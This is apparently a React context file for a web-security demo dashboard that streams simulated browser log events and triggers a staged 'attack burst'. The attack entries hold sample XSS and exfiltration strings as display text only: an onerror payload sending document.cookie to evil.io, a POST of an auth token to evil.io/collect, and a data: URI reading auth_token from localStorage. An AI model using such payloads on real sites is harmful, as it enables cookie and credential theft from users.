"use client";

import React, {
  createContext, useContext, useState, useCallback,
  useEffect, useRef, ReactNode
} from "react";
import { SecurityMode, LogEntry, LogEventType, LogSeverity, LogAction, User } from "@/types";

// ─── Simulated ambient events ─────────────────────────────────────────────────
const AMBIENT_EVENTS: Array<Omit<LogEntry, "id" | "timestamp">> = [
  { type: "info",    eventType: "Network", severity: "low",    action: "logged",   source: "fetch()",               origin: "self",                 message: "Outbound request to /api/logs",                       detail: "GET /api/logs 200 OK — 12ms",                             module: "global" },
  { type: "info",    eventType: "CSP",     severity: "low",    action: "logged",   source: "meta[http-equiv]",      origin: "self",                 message: "CSP policy evaluated",                               detail: "default-src 'self'; script-src 'self' 'nonce-…'",        module: "global" },
  { type: "info",    eventType: "DOM",     severity: "low",    action: "logged",   source: "MutationObserver",      origin: "self",                 message: "DOM mutation detected on <head>",                     detail: "childList change — 1 node added (link[rel=preload])",     module: "global" },
  { type: "request", eventType: "Network", severity: "low",    action: "allowed",  source: "XMLHttpRequest",        origin: "fonts.googleapis.com", message: "Third-party font request allowed",                    detail: "fonts.googleapis.com — policy: allowed CDN",             module: "global" },
  { type: "info",    eventType: "Script",  severity: "low",    action: "logged",   source: "ServiceWorker",         origin: "self",                 message: "Service worker heartbeat",                           detail: "sw.js — cache-first strategy active",                    module: "global" },
  { type: "info",    eventType: "Network", severity: "low",    action: "logged",   source: "fetch()",               origin: "self",                 message: "Request completed: /api/csp-report",                 detail: "POST 204 No Content — 8ms",                               module: "global" },
  { type: "info",    eventType: "CSP",     severity: "medium", action: "logged",   source: "report-uri directive",  origin: "inline",               message: "CSP report-only violation recorded",                 detail: "inline script blocked in report-only mode",              module: "global" },
  { type: "info",    eventType: "DOM",     severity: "low",    action: "logged",   source: "MutationObserver",      origin: "self",                 message: "DOM mutation detected on <body>",                     detail: "attributes change — class updated",                       module: "global" },
  { type: "info",    eventType: "Network", severity: "low",    action: "logged",   source: "fetch()",               origin: "self",                 message: "Periodic health check",                              detail: "GET /api/logs 200 OK — 9ms",                              module: "global" },
  { type: "info",    eventType: "Script",  severity: "low",    action: "logged",   source: "window.performance",    origin: "self",                 message: "Performance entry recorded",                         detail: "LCP 312ms — FID 4ms — CLS 0.02",                        module: "global" },
  { type: "info",    eventType: "CSP",     severity: "low",    action: "enforced", source: "Content-Security-Policy", origin: "self",              message: "Policy promoted from report-only to enforce",        detail: "upgrade-insecure-requests; block-all-mixed-content",     module: "global" },
  { type: "info",    eventType: "Network", severity: "low",    action: "allowed",  source: "img[src]",              origin: "cdn.vercel.com",       message: "Image asset loaded from CDN",                        detail: "cdn.vercel.com/logo.svg 200 OK — 22ms",                  module: "global" },
  { type: "info",    eventType: "DOM",     severity: "low",    action: "logged",   source: "MutationObserver",      origin: "self",                 message: "Attribute change on <html>",                         detail: "lang attribute set: en",                                  module: "global" },
  { type: "blocked", eventType: "Script",  severity: "medium", action: "blocked",  source: "script[src]",           origin: "unknown-cdn.io",       message: "Third-party script blocked",                         detail: "unknown-cdn.io not in CSP allowlist",                    module: "global" },
  { type: "info",    eventType: "Network", severity: "low",    action: "logged",   source: "fetch()",               origin: "self",                 message: "Route prefetch completed",                           detail: "/_next/static/chunks/app 200 OK",                        module: "global" },
];

// ─── Attack burst events ──────────────────────────────────────────────────────
export const ATTACK_BURST: Array<Omit<LogEntry, "id" | "timestamp">> = [
  { type: "exploit", eventType: "Script",  severity: "critical", action: "injected", source: "<script>eval(atob(…))</script>",  origin: "user-input",      message: "Malicious script injection detected",               detail: "eval() called with base64-encoded payload in user input",  module: "global", isBurst: true },
  { type: "exploit", eventType: "DOM",     severity: "critical", action: "injected", source: "innerHTML setter",                origin: "untrusted-input", message: "DOM mutation via innerHTML on #content",            detail: "<img src=x onerror=fetch('//evil.io?c='+document.cookie)>", module: "global", isBurst: true },
  { type: "exploit", eventType: "CSP",     severity: "high",     action: "logged",   source: "report-uri",                     origin: "inline",          message: "CSP violation reported: script-src",                detail: "Blocked URI: 'inline' — violated directive: script-src 'self'", module: "global", isBurst: true },
  { type: "exploit", eventType: "Network", severity: "high",     action: "flagged",  source: "fetch()",                        origin: "injected-script", message: "Exfiltration attempt: credentials sent off-origin", detail: "POST https://evil.io/collect — X-Auth-Token exposed",      module: "global", isBurst: true },
  { type: "exploit", eventType: "Script",  severity: "critical", action: "injected", source: "script[src]",                    origin: "data-uri",        message: "Third-party script injected via data: URI",         detail: "data:text/javascript,window.__token=localStorage.getItem('auth_token')", module: "global", isBurst: true },
  { type: "blocked", eventType: "CSP",     severity: "high",     action: "blocked",  source: "Content-Security-Policy",        origin: "inline",          message: "CSP enforcement blocked inline execution",          detail: "script-src 'nonce-…' rejected — nonce mismatch",           module: "global", isBurst: true },
  { type: "blocked", eventType: "DOM",     severity: "medium",   action: "blocked",  source: "DOMPurify.sanitize()",           origin: "user-input",      message: "XSS payload neutralized by DOMPurify",              detail: "Stripped: onerror, onclick, javascript: URI handlers",     module: "global", isBurst: true },
];

// Fixed interval values — no Math.random() at module level (causes hydration mismatch)
const STREAM_INTERVAL_MS = 4000;

interface SecurityContextType {
  mode: SecurityMode;
  toggleMode: () => void;
  logs: LogEntry[];
  addLog: (entry: Omit<LogEntry, "id" | "timestamp">) => void;
  clearLogs: () => void;
  currentUser: User | null;
  setCurrentUser: (user: User | null) => void;
  simulateAttack: () => void;
  isStreaming: boolean;
  statusCounts: { dom: number; network: number; csp: number; script: number; blocked: number };
}

const SecurityContext = createContext<SecurityContextType | null>(null);

export function SecurityProvider({ children }: { children: ReactNode }) {
  const [mode, setMode]               = useState<SecurityMode>("attack");
  const [logs, setLogs]               = useState<LogEntry[]>([]);
  const [currentUser, setCurrentUser] = useState<User | null>(null);
  const [isStreaming, setIsStreaming]  = useState(true);
  const [statusCounts, setStatusCounts] = useState({
    dom: 0, network: 0, csp: 0, script: 0, blocked: 0,
  });

  const ambientIndex  = useRef(0);
  const streamingRef  = useRef(true);
  // Stable ID counter — no Math.random() to avoid server/client mismatch
  const idCounter     = useRef(0);

  // ── Pure, deterministic entry factory ──────────────────────────────────────
  const makeEntry = useCallback((entry: Omit<LogEntry, "id" | "timestamp">): LogEntry => {
    idCounter.current += 1;
    return {
      ...entry,
      // Use counter + timestamp so IDs are unique but deterministic enough
      id: `${Date.now()}-${idCounter.current}`,
      timestamp: new Date(),
    };
  }, []);

  const addLog = useCallback((entry: Omit<LogEntry, "id" | "timestamp">) => {
    const newEntry = makeEntry(entry);
    setLogs((prev) => [newEntry, ...prev].slice(0, 200));
    setStatusCounts((c) => ({
      dom:     entry.eventType === "DOM"     ? c.dom + 1     : c.dom,
      network: entry.eventType === "Network" ? c.network + 1 : c.network,
      csp:     entry.eventType === "CSP"     ? c.csp + 1     : c.csp,
      script:  entry.eventType === "Script"  ? c.script + 1  : c.script,
      blocked: entry.action    === "blocked" ? c.blocked + 1 : c.blocked,
    }));
  }, [makeEntry]);

  const clearLogs = useCallback(() => {
    setLogs([]);
    setStatusCounts({ dom: 0, network: 0, csp: 0, script: 0, blocked: 0 });
  }, []);

  const toggleMode = useCallback(() => {
    setMode((m) => {
      const next = m === "attack" ? "secure" : "attack";
      const entry = makeEntry({
        type: "info",
        eventType: "global" as LogEventType,
        severity: "info"   as LogSeverity,
        action:   "logged" as LogAction,
        message: `Mode switched to ${next.toUpperCase()}`,
        detail:  `Security posture changed — all modules now reflect ${next} state`,
        module:  "global",
      });
      setLogs((prev) => [entry, ...prev].slice(0, 200));
      return next;
    });
  }, [makeEntry]);

  // ── Ambient streaming — runs CLIENT-SIDE ONLY via useEffect ───────────────
  useEffect(() => {
    // Start streaming after a short delay so initial render is stable
    const initial = setTimeout(() => {
      if (!streamingRef.current) return;
      // Seed the first 3 events quickly
      for (let i = 0; i < 3; i++) {
        setTimeout(() => {
          if (!streamingRef.current) return;
          const idx = ambientIndex.current % AMBIENT_EVENTS.length;
          ambientIndex.current++;
          addLog(AMBIENT_EVENTS[idx]);
        }, i * 700);
      }
    }, 1200);

    const interval = setInterval(() => {
      if (!streamingRef.current) return;
      const idx = ambientIndex.current % AMBIENT_EVENTS.length;
      ambientIndex.current++;
      addLog(AMBIENT_EVENTS[idx]);
    }, STREAM_INTERVAL_MS);

    return () => {
      clearTimeout(initial);
      clearInterval(interval);
    };
  }, [addLog]);

  // ── Simulate attack ────────────────────────────────────────────────────────
  const simulateAttack = useCallback(() => {
    streamingRef.current = false;
    setIsStreaming(false);

    ATTACK_BURST.forEach((event, i) => {
      setTimeout(() => {
        addLog(event);
        if (i === ATTACK_BURST.length - 1) {
          setTimeout(() => {
            streamingRef.current = true;
            setIsStreaming(true);
          }, 3000);
        }
      }, i * 350);
    });
  }, [addLog]);

  return (
    <SecurityContext.Provider value={{
      mode, toggleMode,
      logs, addLog, clearLogs,
      currentUser, setCurrentUser,
      simulateAttack, isStreaming, statusCounts,
    }}>
      {children}
    </SecurityContext.Provider>
  );
}

export function useSecurity() {
  const ctx = useContext(SecurityContext);
  if (!ctx) throw new Error("useSecurity must be used within SecurityProvider");
  return ctx;
}
